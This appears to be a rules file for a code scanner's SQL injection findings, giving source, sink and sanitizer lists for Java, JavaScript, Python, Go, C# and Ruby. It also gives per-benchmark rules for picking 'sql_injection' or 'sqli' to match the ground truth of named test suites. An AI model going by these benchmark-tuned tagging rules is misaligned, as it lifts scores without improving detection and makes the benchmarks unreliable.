- In benchmark mode outside `xben/` and `BenchmarkJava`, normalize confirmed SQL injection to `sql_injection`, not `sqli`.
- For `verademo`, second-order SQL injection in `UserController` and `commands/*` still scores as `sql_injection`.
- For `vulhub`, directories named `*sql*`, `*sqli*`, or ThinkPHP `in-sqlinjection` should preserve `sql_injection` at project-tag layer.
- FALSE POSITIVE guard: keep `sqli` only for `xben/` and `BenchmarkJava` taxonomy.

## Tag Vocabulary

| Tag | When to Use | Benchmark Notes |
|-----|-------------|-----------------|
| `sql_injection` | Default tag for SQL injection findings in most projects (`verademo`, `vulhub`, `SecExample`, general scans) | Long-form canonical tag |
| `sqli` | Short-form tag used only by `xben/` and `BenchmarkJava` ground truth | Do not use outside these projects |
| `blind_sql_injection` | SQL injection where output is not directly visible — boolean-based, time-based, or OOB only | Use when the extraction channel is exclusively blind |
| `sql_injection` + `ldap_injection` | When both SQL and LDAP sinks are reachable from the same input | Tag each sink independently |
| `sql_injection` + `xpath_injection` | When XPath concatenation is the sink | Prefer `xpath_injection` as the primary tag |

## Source -> Sink Pattern

**Sources**
- Active threat-model sources — HTTP params, headers, cookies, path variables, request body (Java, JS, Python, Go, C#, Ruby)
- Java: environment variables in concatenated SQL
- Go: same threat-model sources via active threat-model sources

**Sinks**
- **Java**: `Statement.execute/executeQuery/executeUpdate`; `JdbcTemplate`; `EntityManager.createQuery/createNativeQuery` (not `createNamedQuery`); MyBatis `${...}` substitution in mapper XML and `@Select` annotations; `com.mongodb.BasicDBObject.parse`; cast to `DBObject`; `com.mongodb.util.JSON.parse`
- **JavaScript**: SQL string APIs (`pg.query`, etc.); GraphQL string construction; MongoDB query objects; `ldapjs` DN/filter sinks
- **Python**: SQL construction and execution APIs — includes `cursor.execute`, SQLAlchemy `text()`/`TextClause`
- **Go**: SQL query strings; NoSQL query construction (MongoDB)
- **C#**: ADO.NET, Dapper, NHibernate SQL expression sinks
- **Ruby**: SQL execution and construction APIs

**Sanitizers / barriers**
- Prepared statements / bound parameters (`?`, `:name`) with `setString`/`setParameter` — not concatenated into query text
- Java: simple-type sanitizers (primitives, boxed types, `UUID`, `Date`, enums)
- JavaScript: SQL sanitizer output; `sqlstring` escape; MongoDB `$eq` wrapper or `typeof x === 'string'` check
- Python: constant-comparison barriers; model `sql-injection` barriers
- Go: simple-type sanitizers; model barriers for `sql-injection` and `nosql-injection`
- C#: simple-type and GUID sanitizers; model barriers
- Ruby: string constant compare/array inclusion barriers, SQL sanitization
- **Anti-pattern**: manually quoting placeholders before binding — double-quoting breaks parameterization
